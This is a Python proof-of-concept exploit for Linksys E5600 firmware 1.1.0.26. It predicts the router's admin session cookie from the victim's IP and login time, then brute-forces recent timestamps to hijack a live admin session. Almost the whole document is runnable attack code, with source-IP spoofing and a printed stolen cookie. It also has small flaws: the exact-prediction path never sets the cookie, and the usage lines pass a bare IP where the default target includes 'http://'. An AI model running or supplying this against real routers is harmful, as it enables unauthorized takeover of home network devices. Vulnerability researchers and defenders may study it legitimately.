#!/usr/bin/env python3
"""
Linksys E5600 firmware 1.1.0.26
Predictable admin session ID -> admin session hijack (PoC)

sessionid = <client-IP dots-stripped> + <epoch seconds at login>
(login.cgi uses format "%s%lli" with gettimeofday; no randomness)
mod_session.so validates the HSESSIONID cookie but never binds it to the
requester's source IP -> cross-IP hijack.

Usage:
    python poc.py --target 192.168.1.1 --victim-ip 192.168.1.2
    python poc.py --target 192.168.1.1 --victim-ip 192.168.1.2 --login-time 1787831567
    python poc.py --target 192.168.1.1 --victim-ip 192.168.1.2 --source-ip 192.168.1.100
"""
import argparse
import socket
import time

import requests
from requests.adapters import HTTPAdapter


class SourceIPAdapter(HTTPAdapter):
    """requests adapter that binds the outgoing socket to a source IP."""

    def __init__(self, source_ip=None, *args, **kwargs):
        self.source_ip = source_ip
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.source_ip:
            kwargs["source_address"] = (self.source_ip, 0)
        super().init_poolmanager(*args, **kwargs)


def predict_session_id(victim_ip, epoch):
    return f"{victim_ip.replace('.', '')}{epoch}"


def is_admin_panel(session, target, sid):
    r = session.get(f"{target}/system-status.html", timeout=6)
    # full admin page (7702 B) vs. 55-byte redirect stub to /wizard.html
    return len(r.content) > 1000, len(r.content)


def main():
    ap = argparse.ArgumentParser(description="Linksys E5600 session hijack PoC")
    ap.add_argument("--target", default="http://192.168.1.1")
    ap.add_argument("--victim-ip", required=True, help="admin's client IP")
    ap.add_argument("--source-ip", default=None,
                    help="bind requests to this source IP (emulation only)")
    ap.add_argument("--login-time", type=int, default=None,
                    help="known/guessed epoch of the victim's login")
    ap.add_argument("--window", type=int, default=900,
                    help="brute-force window in seconds (session timeout is 600)")
    args = ap.parse_args()

    s = requests.Session()
    if args.source_ip:
        s.mount(args.target, SourceIPAdapter(args.source_ip))

    print(f"[*] target   : {args.target}")
    print(f"[*] victim IP: {args.victim_ip}")
    print(f"[*] attacker : {args.source_ip or 'own IP'}")

    # --- exact prediction ----------------------------------------------------
    if args.login_time is not None:
        sid = predict_session_id(args.victim_ip, args.login_time)
        ok, size = is_admin_panel(s, args.target, sid)
        if ok:
            print(f"[+] EXACT PREDICTION: HSESSIONID={sid} -> admin page ({size} B)")
            return
        print(f"[!] predicted {sid} not active -> falling back to brute force")

    # --- brute force the session window --------------------------------------
    now = int(time.time())
    print(f"[*] brute-forcing sessionid = {args.victim_ip.replace('.','')} + <epoch>, "
          f"window [now-{args.window}, now]")
    for dt in range(args.window + 1):
        epoch = now - dt
        sid = predict_session_id(args.victim_ip, epoch)
        s.cookies.set("HSESSIONID", sid)
        ok, size = is_admin_panel(s, args.target, sid)
        if ok:
            print(f"[+] FOUND! sessionid=HSESSIONID:{sid} (login epoch ~{epoch})")
            print(f"[+] /system-status.html -> {size} bytes (admin panel)")
            print(f"[+] Cookie to use: HSESSIONID={sid}")
            return
    print("[-] no active admin session in the window "
          "(victim must have a live session; try --window or --login-time)")


if __name__ == "__main__":
    main()
